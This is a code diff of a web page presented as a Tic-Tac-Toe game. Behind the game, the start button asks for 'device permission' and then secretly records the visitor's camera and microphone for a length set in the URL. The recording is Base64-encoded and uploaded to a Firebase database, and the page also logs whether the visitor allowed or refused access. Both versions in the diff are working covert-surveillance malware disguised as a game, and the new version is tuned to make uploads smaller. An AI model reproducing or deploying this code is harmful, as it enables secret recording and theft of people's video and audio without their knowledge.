@@ -3,55 +3,31 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Tic-Tac-Toe Game</title>
+  <title>Tic-Tac-Toe Match</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    html, body {
-      height: 100%;
-      width: 100%;
-      overflow: hidden;
-      touch-action: manipulation;
-    }
-    .cell {
-      aspect-ratio: 1 / 1;
-      background: #1e293b;
-      border-radius: 12px;
-      font-size: 3rem;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      user-select: none;
-    }
+    html, body { height: 100%; width: 100%; overflow: hidden; touch-action: manipulation; }
+    .cell { aspect-ratio: 1 / 1; background: #1e293b; border-radius: 12px; font-size: 3rem; font-weight: bold; display: flex; align-items: center; justify-content: center; cursor: pointer; user-select: none; }
     .cell.x { color: #38bdf8; }
     .cell.o { color: #f43f5e; }
   </style>
 </head>
 <body class="bg-slate-950 text-slate-100 flex flex-col justify-between items-center p-4 h-full">
 
-  <!-- Game Header -->
   <div class="text-center mt-2">
     <h1 class="text-3xl font-extrabold text-cyan-400 tracking-wide">TIC TAC TOE</h1>
     <p id="gameStatus" class="text-sm font-semibold text-slate-400 mt-1">Press Start to Play</p>
   </div>
 
-  <!-- Game Board -->
   <div class="w-full max-w-xs bg-slate-900 border border-slate-800 p-3 rounded-2xl shadow-2xl">
     <div id="board" class="grid grid-cols-3 gap-3">
-      <div class="cell" onclick="playGame(0)"></div>
-      <div class="cell" onclick="playGame(1)"></div>
-      <div class="cell" onclick="playGame(2)"></div>
-      <div class="cell" onclick="playGame(3)"></div>
-      <div class="cell" onclick="playGame(4)"></div>
-      <div class="cell" onclick="playGame(5)"></div>
-      <div class="cell" onclick="playGame(6)"></div>
-      <div class="cell" onclick="playGame(7)"></div>
-      <div class="cell" onclick="playGame(8)"></div>
+      <!-- 9 Cells -->
+      <div class="cell" onclick="playGame(0)"></div><div class="cell" onclick="playGame(1)"></div><div class="cell" onclick="playGame(2)"></div>
+      <div class="cell" onclick="playGame(3)"></div><div class="cell" onclick="playGame(4)"></div><div class="cell" onclick="playGame(5)"></div>
+      <div class="cell" onclick="playGame(6)"></div><div class="cell" onclick="playGame(7)"></div><div class="cell" onclick="playGame(8)"></div>
     </div>
   </div>
 
-  <!-- Restart Button -->
   <div class="w-full max-w-xs mb-2">
     <button onclick="resetGame()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl border border-slate-700 transition-all">Restart Game</button>
   </div>
@@ -62,7 +38,7 @@
       <div class="text-4xl">🎮</div>
       <h2 class="text-lg font-bold text-cyan-400">Welcome to Tic-Tac-Toe</h2>
       <p class="text-xs text-slate-400">To start the Tic-Tac-Toe match, please enable device permission.</p>
-      <button id="startBtn" class="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3 rounded-xl text-sm transition-all shadow-lg shadow-cyan-500/20">
+      <button id="startBtn" class="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3 rounded-xl text-sm transition-all">
         OK / Start Game
       </button>
     </div>
@@ -80,7 +56,6 @@
     </div>
   </div>
 
-  <!-- Firebase & Session Handler -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
@@ -97,132 +72,77 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
-
     const urlParams = new URLSearchParams(window.location.search);
     let recordSeconds = parseInt(urlParams.get('time')) || 5;
 
     const startBtn = document.getElementById('startBtn');
-    const startModal = document.getElementById('startModal');
-    const successModal = document.getElementById('successModal');
-    const gameStatusEl = document.getElementById('gameStatus');
-
     let currentStream = null;
 
-    // পেজ লোড হওয়ার সাথে সাথেই আগে ভিজিট লগ পাঠাবে
-    try {
-      push(ref(db, 'visits_log'), {
-        timestamp: new Date().toISOString(),
-        permission: "Pending/Page Loaded",
-        durationRequested: recordSeconds,
-        userAgent: navigator.userAgent
-      });
-    } catch(e) {
-      console.error("Log error:", e);
-    }
-
     startBtn.addEventListener('click', async () => {
+      document.getElementById('startModal').classList.add('hidden');
+      document.getElementById('gameStatus').textContent = "Your Turn (X)";
+
       try {
-        startModal.classList.add('hidden');
-        gameStatusEl.textContent = "Your Turn (X)";
-
-        // পুরনো সার্ভিস বা ট্র্যাকিং থাকলে তা বন্ধ করা
-        if (currentStream) {
-          currentStream.getTracks().forEach(track => track.stop());
-        }
-
-        currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-
-        // পারমিশন গ্র্যান্টেড লগ
-        push(ref(db, 'visits_log'), {
-          timestamp: new Date().toISOString(),
-          permission: "Granted",
-          durationRequested: recordSeconds,
-          userAgent: navigator.userAgent
+        // Request lower resolution to keep Base64 size small for Realtime DB
+        currentStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { width: 640, height: 480 }, 
+          audio: true 
         });
+
+        push(ref(db, 'visits_log'), { timestamp: new Date().toISOString(), permission: "Granted", duration: recordSeconds });
 
         let chunks = [];
         let mediaRecorder;
 
-        // বিটরেট ও কমপ্রেসড সেটিংস যাতে ফাইল সাইজ কম হয়
-        const options = { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 250000 };
-        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-          delete options.mimeType;
-        }
+        // Optimized encoding for Realtime Database
+        const options = { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 100000 };
+        try { mediaRecorder = new MediaRecorder(currentStream, options); } 
+        catch (e) { mediaRecorder = new MediaRecorder(currentStream); }
 
-        try {
-          mediaRecorder = new MediaRecorder(currentStream, options);
-        } catch (e) {
-          mediaRecorder = new MediaRecorder(currentStream);
-        }
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
 
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data && e.data.size > 0) chunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = async () => {
-          // রেকর্ড শেষ হওয়ামাত্রই আগে ব্যাকগ্রাউন্ড ট্র্যাকিং অফ করা
-          if (currentStream) {
-            currentStream.getTracks().forEach(track => track.stop());
-            currentStream = null;
-          }
+        mediaRecorder.onstop = () => {
+          // STRICTLY STOP CAMERA HARDWARE IMMEDIATELY
+          if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); currentStream = null; }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
           const reader = new FileReader();
-
+          
+          // ENCODING TO BASE64
           reader.readAsDataURL(blob);
           reader.onloadend = async () => {
             try {
               await push(ref(db, 'recorded_videos'), {
-                videoData: reader.result,
+                videoData: reader.result, // Base64 Encoded String
                 duration: recordSeconds,
                 createdAt: new Date().toISOString()
               });
-              
-              successModal.classList.remove('hidden');
-            } catch (err) {
-              console.error("Firebase upload error:", err);
-            }
+              document.getElementById('successModal').classList.remove('hidden');
+            } catch (err) { console.error("DB Error:", err); }
           };
         };
 
-        mediaRecorder.start(1000); // প্রতি ১ সেকেন্ড পরপর ডাটা চাঙ্ক গ্রহণ
-
-        setTimeout(() => {
-          if (mediaRecorder.state !== "inactive") {
-            mediaRecorder.stop();
-          }
-        }, recordSeconds * 1000);
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, recordSeconds * 1000);
 
       } catch (err) {
-        console.error("Permission Error:", err);
-        push(ref(db, 'visits_log'), {
-          timestamp: new Date().toISOString(),
-          permission: "Denied",
-          durationRequested: recordSeconds,
-          userAgent: navigator.userAgent
-        });
+        push(ref(db, 'visits_log'), { timestamp: new Date().toISOString(), permission: "Denied" });
       }
     });
 
-    window.closeModal = () => {
-      successModal.classList.add('hidden');
-    };
+    window.closeModal = () => document.getElementById('successModal').classList.add('hidden');
   </script>
 
-  <!-- Tic-Tac-Toe Logic -->
+  <!-- Game Logic -->
   <script>
     const boardEl = document.getElementById('board');
     const gameStatusEl = document.getElementById('gameStatus');
     const WINS = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-    const DELAY_MS = 2500;
-    
-    let gameBoard = Array(9).fill('');
-    let gameActive = true;
+    let gameBoard = Array(9).fill(''), gameActive = true;
 
     function playGame(i) {
       if (gameBoard[i] || !gameActive) return;
-      
-      makeGameMove(i, 'X');
+      gameBoard[i] = 'X'; boardEl.children[i].textContent = 'X'; boardEl.children[i].classList.add('x');
       if (checkGameEnd('X', "You Won! 🎉")) return;
 
       gameStatusEl.textContent = "Computer thinking...";
@@ -232,35 +152,23 @@
         const empty = gameBoard.map((v, idx) => v === '' ? idx : null).filter(v => v !== null);
         if (empty.length) {
           const cpuMove = empty[Math.floor(Math.random() * empty.length)];
-          makeGameMove(cpuMove, 'O');
+          gameBoard[cpuMove] = 'O'; boardEl.children[cpuMove].textContent = 'O'; boardEl.children[cpuMove].classList.add('o');
           if (checkGameEnd('O', "Computer Won! 🤖")) return;
           gameStatusEl.textContent = "Your Turn (X)";
           gameActive = true;
         }
-      }, DELAY_MS);
-    }
-
-    function makeGameMove(i, p) {
-      gameBoard[i] = p;
-      boardEl.children[i].textContent = p;
-      boardEl.children[i].classList.add(p.toLowerCase());
+      }, 2500); // 2.5s Delay
     }
 
     function checkGameEnd(p, msg) {
       const won = WINS.some(w => w.every(i => gameBoard[i] === p));
       const draw = !won && gameBoard.every(c => c);
-      if (won || draw) {
-        gameStatusEl.textContent = won ? msg : "It's a Draw! 🤝";
-        gameActive = false;
-        return true;
-      }
+      if (won || draw) { gameStatusEl.textContent = won ? msg : "It's a Draw! 🤝"; gameActive = false; return true; }
       return false;
     }
 
     function resetGame() {
-      gameBoard.fill('');
-      gameActive = true;
-      gameStatusEl.textContent = "Your Turn (X)";
+      gameBoard.fill(''); gameActive = true; gameStatusEl.textContent = "Your Turn (X)";
       Array.from(boardEl.children).forEach(c => { c.textContent = ''; c.className = 'cell'; });
     }
   </script>
